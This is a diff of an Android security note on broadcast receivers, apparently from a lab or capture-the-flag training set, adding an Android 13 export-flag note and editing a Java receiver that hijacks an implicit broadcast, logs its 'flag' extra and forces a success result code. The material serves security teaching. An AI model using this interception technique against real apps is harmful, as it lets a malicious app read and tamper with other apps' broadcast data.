@@ -24,8 +24,7 @@ You can register a receiver in **two ways**:
 * It can receive broadcasts even when your app is not running (e.g., listening for `ACTION_BOOT_COMPLETED`).
 
 ```xml
-<receiver android:name=".MyBootReceiver"
-          android:exported="true">
+<receiver android:name=".MyBootReceiver" android:exported="true">
     <intent-filter>
         <action android:name="android.intent.action.BOOT_COMPLETED" />
     </intent-filter>
@@ -47,6 +46,8 @@ registerReceiver(receiver, filter)
 ```
 
 In this case, if the system sends this broadcast intent, then the class `receiver` is used as the receiver and it'll execute the code in the `onReceive()` method.
+
+> **Note**: On Android 13 (API 33) and above, `registerReceiver()` requires explicitly declaring whether a dynamically registered broadcast receiver is exported when listening to unprotected broadcasts. This is done by supplying one of the following flags: `Context.RECEIVER_EXPORTED`, `Context.RECEIVER_NOT_EXPORTED`.
 
 ### Send broadcasts
 
@@ -165,7 +166,7 @@ For more information, refer to [Intent attack surface - Intent redirect](intent%
 
 This is when the an app sends an implicit intent broadcast so a malicious app can register a receiver to be a valid target for the implicit intent.
 
-1. Identify an app that sends implicit broadcast, e.g. `application.Context.sendBroadcast(new Intent(SPAReceiver.ACTION_SP_APPS_QUERY_FEEDS))`.
+1. Identify an app that sends implicit broadcast.
 2. Use the dynamic registered receivers in your activity. This means the app must be already running.
 
 ```java
@@ -213,7 +214,11 @@ To intercept this intent I have to register a receiver and send `resultCode != 0
 BroadcastReceiver hijackReceiver = new BroadcastReceiver() {
     @Override
     public void onReceive(Context context, Intent intent) {
-        setResultCode(RESULT_OK); // Costant value for -1
+        String flag = intent.getStringExtra("flag");
+        if (flag != null) {
+            Log.d("flag", flag);
+        }
+        setResultCode(RESULT_OK); // Costant value for -1. We add this to trigger success()
     }
 };
 registerReceiver(hijackReceiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"));
